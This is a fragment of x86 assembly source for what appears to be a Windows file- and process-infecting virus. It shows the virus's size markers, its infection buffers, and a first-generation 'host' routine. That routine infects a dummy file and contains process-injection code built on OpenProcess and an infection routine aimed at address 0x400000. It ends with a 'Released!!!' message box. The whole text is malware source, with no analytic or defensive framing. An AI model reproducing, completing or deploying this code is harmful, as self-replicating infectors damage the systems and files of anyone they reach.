        SUBCALL search_api_addr,get_extra_proc_ip
get_extra_proc_4:

        popad
        retn
get_extra_proc_end:
;*******************************mainthrd.asm end*****************************

;code and initialized data end here
vir_size equ $-_start

;Uninitialized data
        ftime db 3*8 dup(0)
        is9x dd 0
        quick_sleep dd 0
        infbuffer db vir_size+10 dup(0)
        pathname_buf db MAX_DIR_SIZE*2+100 dup(0)
        vbuffer db INFPROC_MAP_SIZE+100 dup(0)
        snapbuf db 300 dup(0)

if DEBUG
hexstr db 16 dup(0)
endif

vir_mem_size equ $-_start

host:
        mov eax,0

        mov eax,vir_first_blk_size
        mov ebx,vir_mem_size
        mov ebp,offset _start_ip

        SUBCALL prepare_buffer,_start_ip

        lea edi,dummyfile
        SUBCALL file_operate,_start_ip

jmp over
        push large 0fffdb43dh
        push large 0
        push large 0fffh
        call [ebp+addrOpenProcess-_start_ip]
        push eax
        xchg eax,edi

        mov ebx,400000h
        SUBCALL inf_proc,_start_ip

        call [ebp+addrCloseHandle-_start_ip]

over:
        push large 0
        push offset cap
        call nxt
if DEBUG
        db 'Game over',0
else
        db 'Released!!!',0
endif
nxt:
        push large 0
        call MessageBoxA

push large 0
call ExitProcess

end _start
